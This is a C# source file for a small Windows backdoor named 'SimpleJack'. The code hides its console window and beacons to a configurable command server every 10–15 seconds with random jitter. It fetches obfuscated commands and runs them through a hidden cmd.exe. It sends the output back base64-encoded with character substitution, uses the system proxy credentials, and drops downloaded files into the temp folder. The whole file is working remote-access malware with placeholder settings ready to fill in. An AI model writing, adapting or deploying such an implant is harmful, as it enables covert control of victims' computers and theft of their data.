using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace SimpleJack
{

    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr VAR102, UInt32 VAR101);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        static void Run(string cmd, string url)
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                Process p = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                startInfo.FileName = "cmd.exe";
                startInfo.CreateNoWindow = true;
                startInfo.Arguments = "/c " + cmd;
                p.StartInfo = startInfo;
                p.Start();

                sb.Append(p.StandardOutput.ReadToEnd());
                sb.Append("\r\nError:" + p.StandardError.ReadToEnd() + "\r\n");
            }
            catch (Exception e)
            {

            }
            SendRequest(url, sb.ToString(), "");
            
        }

        static byte[] SendRequest(string url, string data, string downloadStr)
        {
            WebClient client = new WebClient();
            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
            if (defaultProxy != null)
            {
                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
                client.Proxy = defaultProxy;
            }

            if (data.Equals(""))
            {
                return client.DownloadData(url + "?" + (!downloadStr.Equals("") ? downloadStr + "=" : "") + Environment.GetEnvironmentVariable("USERNAME"));
            }
            else
            {
                string dataPost = Convert.ToBase64String(Encoding.ASCII.GetBytes(data));
                dataPost = dataPost.Replace("A", "!)(*&#:<]");
                client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                client.UploadString(url, dataPost);
                return new byte[] { };
            }
        }

        static void Main(string[] args)
        {
            string downloadArg = "CHANGEME";
            string filename = "CHANGEME";
            string url = args.Length > 1 ? args[0] : "CHANGEME";
            string currentMd5 = "";
            string currentDataMd5 = "";
            Random rand = new Random();

            ShowWindow(GetConsoleWindow(), 0);
            if (true)
            {
                while (true)
                {
                    byte[] cmd = SendRequest(url, "", "");
                    Array.Reverse(cmd, 0, cmd.Length);
                    string run = Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(cmd)));

                    MD5 md5 = MD5.Create();
                    string md5Result = Encoding.ASCII.GetString(md5.ComputeHash(Encoding.ASCII.GetBytes(run)));

                    byte[] data = SendRequest(url, "", downloadArg);
                    Array.Reverse(data, 0, data.Length);
                    string fileData = Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(data)));

                    MD5 dataMd5 = MD5.Create();
                    string dataMd5Result = Encoding.ASCII.GetString(md5.ComputeHash(Encoding.ASCII.GetBytes(fileData)));

                    if(!dataMd5Result.Equals(currentDataMd5))
                    {
                        FileStream fs = new FileStream(Path.GetTempPath() + filename, FileMode.Create, FileAccess.Write);
                        fs.Write(Encoding.ASCII.GetBytes(fileData), 0, fileData.Length);
                        fs.Close();
                    }

                    if (!md5Result.Equals(currentMd5))
                    {
                        if (run.Length > 0)
                        {
                            Thread t = new Thread(() => Run(run, url));
                            t.Start();
                        }
                    }
                    Thread.Sleep(10000 + rand.Next(0, 5000));
                    currentMd5 = md5Result;
                    currentDataMd5 = dataMd5Result;
                }
            }
        }
    }
}
